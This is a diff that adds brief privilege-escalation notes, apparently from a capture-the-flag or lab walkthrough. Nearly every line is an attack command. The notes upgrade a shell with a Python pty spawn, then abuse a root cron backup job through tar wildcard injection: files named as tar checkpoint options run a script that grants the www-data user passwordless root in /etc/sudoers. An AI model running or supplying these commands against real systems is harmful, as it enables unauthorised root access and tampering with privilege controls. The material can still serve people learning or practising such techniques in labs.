@@ -1,0 +1,14 @@
+
+to upgrade it to a interactive tty shell, using the following Python command:
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+checking Crontab
+cat /etc/crontab  (running backup.sh)
+
+To take advantage ,  create a script to add our user to sudoers and gain root while on the machine:
+
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh    (write under /var/www.html)
+touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
+touch "/var/www/html/--checkpoint=1"
+
+ 
